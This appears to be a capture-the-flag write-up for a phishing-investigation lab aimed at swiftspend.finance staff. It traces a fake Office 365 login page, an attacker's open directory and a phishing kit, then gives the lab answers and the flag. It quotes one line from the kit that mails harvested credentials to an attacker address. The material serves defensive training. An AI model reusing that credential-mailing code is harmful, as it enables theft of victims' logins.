@@ -1,0 +1,119 @@
+# Room Name - TryHackMe: Snapped Phish-ing Line
+Date: 25 July 2026
+Difficulty: Easy
+Category: Phishing Analysis / OSINT / Threat Investigation
+
+# Scenario
+Apply learned skills to probe malicious emails and URLs, exposing a vast phishing campaign. The challenge involved investigating a set of phishing emails targeting employees of swiftspend.finance, tracing the attack infrastructure, downloading and analysing the phishing kit, recovering captured credentials, and decoding a hidden flag from the attacker's server.
+
+# Tools Used
+- TryHackMe Attack Box
+- Terminal (bash)
+- Browser
+- VirusTotal
+- CyberChef
+- sha256sum
+
+# What I Did
+
+Step 1 — Enumerate the phishing email files
+- Launched the TryHackMe machine and navigated to the phish-emails folder on the desktop.
+- Found 5 email files targeting swiftspend.finance employees:
+```
+/home/damianhall/Desktop/phish-emails/
+├── Group Marketing Online Direct Credit Advice - derick.marshall@swiftspend.finance.eml
+├── Group Marketing Online Direct Credit Advice - michael.ascot@swiftspend.finance.eml
+├── Group Marketing Online Direct Credit Advice - michelle.chen@swiftspend.finance.eml
+├── Group Marketing Online Direct Credit Advice - zoe.duncan@swiftspend.finance.eml
+└── Quote for Services Rendered processed on June 29 2020 100132 AM.eml
+```
+
+Step 2 — Identify the recipient of the Quote for Services Rendered email
+- Opened the Quote for Services Rendered email and inspected the To field:
+```
+To: William McClean <william.mcclean@swiftspend.finance>
+```
+
+Step 3 — Identify the adversary's sending address
+- Inspected the From field across the phishing emails:
+```
+From: Group Marketing Online Accounts Payable <Accounts.Payable@groupmarketingonline.icu>
+```
+
+Step 4 — Investigate the attachment in Zoe Duncan's email
+- Opened the email addressed to zoe.duncan@swiftspend.finance.
+- Found an HTML attachment (509 bytes): Direct Credit Advice.html
+- Opened the attachment in the browser which redirected to:
+```
+http://kennaroads.buzz/data/Update365/office365/40e7baa2f826a57fcf04e5202526f8bd/enterpassword.php?C36655178499832852a4b70a6c575a75446fd215c968952252a4b70a6c575a75446fd215c968952252a4b70a6c575a75446fd215c968952252a4b70a6c575a75446fd215c968952252a4b70a6c575a75446fd215c9689522&email=zoe.duncan@swiftspend.finance&error=
+```
+- Root domain: kennaroads.buzz
+- The login page impersonated: Microsoft (Office 365 login portal)
+
+Step 5 — Enumerate the attacker's exposed /data directory
+- Navigated to http://kennaroads.buzz/data/ and found an open directory listing containing:
+  - Update365.zip (archive file)
+  - Update365/ (directory)
+
+Step 6 — Download and hash the phishing kit
+- Downloaded Update365.zip to the virtual machine.
+- Generated the SHA256 hash:
+```
+sha256sum Update365.zip
+ba3c15267393419eb08c7b2652b8b6b39b406ef300ae8a18fee4d16b19ac9686  Update365.zip
+```
+
+Step 7 — Investigate the hash on VirusTotal
+- Submitted the SHA256 hash to VirusTotal.
+- Popular threat label: trojan.phishmailer/akgpp
+- Threat categories assigned: phishing, trojan, hacktool
+- Additional threat category beyond phishing: Trojan
+- Archive contained 49 files (520.27 KB uncompressed)
+
+Step 8 — Investigate the credential log
+- Navigated to http://kennaroads.buzz/data/Update365/ and found an exposed log file.
+- Reviewed the log and identified two entries for the same email address submitted on the same date, confirming repeated credential submission:
+  - michael.ascot@swiftspend.finance (submitted twice on Mon Jun 29, 2020)
+
+Step 9 — Extract the adversary's collection email from submit.php
+- Extracted Update365.zip and located submit.php at:
+```
+/Update365/office365/Validation/submit.php
+```
+- Found the attacker's credential collection email hardcoded in the mail function:
+```
+mail("m3npat@yandex.com", $bron, $message, $lagi);
+```
+
+Step 10 — Locate and decode the flag
+- Navigated to the flag file on the attacker's server:
+```
+http://kennaroads.buzz/data/Update365/office365/flag.txt
+```
+- Found the encoded string: fUxSVV8zSHRfaFQxd195NExwe01IVAo=
+- Decoded from Base64 in CyberChef, which returned the string in reverse: }LRU_3Ht_hT1w_y4Lp{MHT
+- Applied the Reverse operation in CyberChef to recover the flag.
+
+# What I Found
+- Recipient of Quote for Services Rendered: William McClean
+- Adversary sending address: Accounts.Payable@groupmarketingonline.icu
+- Redirection root domain: kennaroads.buzz
+- Impersonated company: Microsoft
+- Phishing kit archive: Update365.zip
+- SHA256 of archive: ba3c15267393419eb08c7b2652b8b6b39b406ef300ae8a18fee4d16b19ac9686
+- Additional VirusTotal threat category: Trojan
+- Files in archive: 49
+- User who submitted credentials more than once: michael.ascot@swiftspend.finance
+- Adversary credential collection email: m3npat@yandex.com
+- Flag: THM{pL4y_w1Th_tH3_URL}
+
+# Key Learning
+HTML attachments are an effective phishing delivery mechanism because they do not contain a payload themselves — they simply redirect the browser to an attacker-controlled page, bypassing many attachment scanning controls. Open directory listings on attacker infrastructure can expose the entire phishing kit, credential logs, and even hidden flags, making enumeration of the base URL a valuable investigation step. Phishing kits frequently contain hardcoded attacker email addresses in PHP scripts, providing a persistent indicator of compromise that can be used for attribution and cross-campaign correlation. Base64-encoded strings stored on attacker servers may require additional operations such as reversing to reveal the final plaintext.
+
+# What I Would Flag in a Real SOC
+- HTML attachments in emails should be treated with the same scrutiny as executable attachments, browser-based redirection via HTML files is a deliberate bypass of gateway attachment scanning
+- The sending domain groupmarketingonline.icu uses a non-standard TLD (.icu) which is frequently associated with phishing infrastructure and should be added to a blocklist upon identification
+- Open directory listings on attacker-controlled infrastructure indicate poor operational security and should be documented as an opportunity to enumerate the full scope of the campaign
+- A credential log exposed on the phishing server containing victim email addresses and IP addresses constitutes a live data breach and should be escalated immediately for victim notification
+- Hardcoded Yandex email addresses in phishing kit PHP scripts are a known attacker pattern, m3npat@yandex.com should be submitted to threat intelligence platforms and cross-referenced against known campaigns
+- The SHA256 hash of the phishing kit being flagged as trojan and hacktool on VirusTotal confirms this is a reused kit with prior detections, hash-based blocking should be applied across all endpoints in the environment
